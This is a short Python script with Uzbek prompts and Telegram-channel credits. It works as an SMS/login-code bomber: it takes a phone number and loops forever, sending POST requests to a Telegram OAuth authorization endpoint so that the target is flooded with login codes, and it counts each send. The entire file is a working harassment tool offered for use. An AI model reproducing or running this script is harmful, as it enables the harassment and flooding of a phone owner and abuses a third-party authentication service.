import requests

ph = input('Dasturchi: @sultonbek_of \n\nTelefon raqamni kiriting [mamlakat kodi bilan va + belgisiz] ')
newPh = ph.replace('+','')

headers = {
    'bot_id': '1288099309',
    'origin': 'https://t.me',
    'lang': 'en'
}

data = {
    'phone': newPh
}


c = 0
while True:
    try:
        r = requests.post('https://oauth.tg.dev/auth/request?bot_id=1288099309&origin=https://t.me&lang=uz', headers=headers, data=data)
        c += 1
        print('Yuborildi: ' + str(c) + ' marta')
    except requests.exceptions.RequestException as e:
        print('Xato yuz berdi: ' + str(e))
# Kanal : @levod_dev Dasturchi : @devODILOV
#Manba.ga  tegilmasin